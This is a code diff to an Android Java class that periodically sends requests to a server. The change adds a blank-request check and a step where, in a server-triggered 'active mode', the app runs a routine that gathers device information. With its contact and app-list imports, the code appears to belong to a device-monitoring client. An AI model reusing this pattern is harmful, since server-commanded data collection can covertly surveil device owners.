@@ -18,6 +18,7 @@ import com.inet.android.bs.ListApp;
 import com.inet.android.contacts.GetContacts;
 import com.inet.android.db.RequestDataBaseHelper;
 import com.inet.android.db.RequestWithDataBase;
+import com.inet.android.info.GetInfo;
 import com.inet.android.utils.Logging;
 
 /**
@@ -30,6 +31,7 @@ public class PeriodicRequest extends DefaultRequest {
 	private final String LOG_TAG = "PeriodicRequest";
 	static RequestDataBaseHelper db;
 	private final int type = 2;
+	boolean periodicalFlag = true;
 	Context ctx;
 
 	public PeriodicRequest(Context ctx) {
@@ -64,29 +66,34 @@ public class PeriodicRequest extends DefaultRequest {
 
 	@Override
 	protected void sendPostRequest(String request) {
-		String str = null;
-		try {
-			Logging.doLog(LOG_TAG, request, request);
-			str = Caller.doMake(request, "periodic", ctx);
-		} catch (IOException e) {
-			e.printStackTrace();
-			db = new RequestDataBaseHelper(ctx);
+		if (!request.equals(" ")) {
+			String str = null;
+			try {
+				Logging.doLog(LOG_TAG, request, request);
+				str = Caller.doMake(request, "periodic", ctx);
+			} catch (IOException e) {
+				e.printStackTrace();
+				db = new RequestDataBaseHelper(ctx);
 
-			if (db.getExistType(type) == false) {
-				db.addRequest(new RequestWithDataBase(request, type));
+				if (db.getExistType(type) == false) {
+					db.addRequest(new RequestWithDataBase(request, type));
+				}
 			}
-		}
-		if (str != null) {
-			getRequestData(str);
-		} else {
-			Logging.doLog(LOG_TAG, "ответа от сервера нет или он некорректен",
-					"ответа от сервера нет или он некорректен");
-			SharedPreferences sp = PreferenceManager
-					.getDefaultSharedPreferences(ctx);
-			Editor ed = sp.edit();
-			ed.putString("code", "1");
-			ed.commit();
+			if (str != null) {
+				getRequestData(str);
+			} else {
+				Logging.doLog(LOG_TAG,
+						"ответа от сервера нет или он некорректен",
+						"ответа от сервера нет или он некорректен");
+				SharedPreferences sp = PreferenceManager
+						.getDefaultSharedPreferences(ctx);
+				Editor ed = sp.edit();
+				ed.putString("code", "1");
+				ed.commit();
 
+			}
+		} else {
+			Logging.doLog(LOG_TAG, "request == null", "request == null");
 		}
 	}
 
@@ -151,6 +158,11 @@ public class PeriodicRequest extends DefaultRequest {
 
 		// активный режим работы
 		if (str.equals("2")) {
+			if (sp.getBoolean("getInfo", false) == true) {
+				GetInfo getInfo = new GetInfo(ctx);
+				getInfo.getInfo();
+				ed.putBoolean("getInfo", false);
+			}
 			ed.putString("period", "1");
 			String listStr = null;
 			try {
